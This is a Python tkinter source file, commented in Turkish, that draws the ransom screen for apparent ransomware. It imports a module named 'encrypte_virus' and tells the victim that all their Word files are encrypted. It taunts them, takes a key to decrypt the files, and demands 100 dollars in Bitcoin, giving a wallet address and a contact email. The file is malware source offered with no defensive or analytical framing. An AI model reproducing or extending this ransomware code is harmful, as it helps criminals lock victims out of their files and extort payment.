import tkinter as tk
import encrypte_virus


def sifreal():
    key=giris.get()  #alinan anahtar atamasi
    bytekey=key.encode()  #anahtarin binary arraya donusturlmesi
    for i in range(0,encrypte_virus.gelenbelge-1):
        encrypte_virus.coz(i,bytekey) #sifrelerin cozulmesi icin cagirilan fonksiyon

# Ana pencere oluştur
root = tk.Tk()
root.geometry('600x500')
root.configure(bg='black')
root.resizable()
uyari= tk.Label( root, text="\nTÜM WORD DOSYALARIN ŞİFRELENDİ!!\n\nAçmak için anahtarı gir.",background="black",fg="white",font=20)
uyari.pack()
uyari2= tk.Label( root, text="Eğer anahtarin varsa :D",background="black",fg="red",font=20)
uyari2.pack()

giris= tk.Entry(root,justify="center",width=50,selectforeground="white",background="grey",fg="white",cursor="star")
giris.pack(pady=50,padx=50)
dosya=tk.Button(root,text = 'Dosyalari Aç',activebackground="red",background="grey",fg="white", command=sifreal)
dosya.pack()
uyari3= tk.Label( root, text="\nDosyalara erisim icin bu adrese 100$BTC at ve mailden ulas\nbtc adresi=17ffpJGdKbHA5iDXJLMRhy4WSGdPxwXqr5\n mail=xopiwe3714@moneyzon.com",background="black",fg="red",font=20)
uyari3.pack()
root.update()
root.mainloop()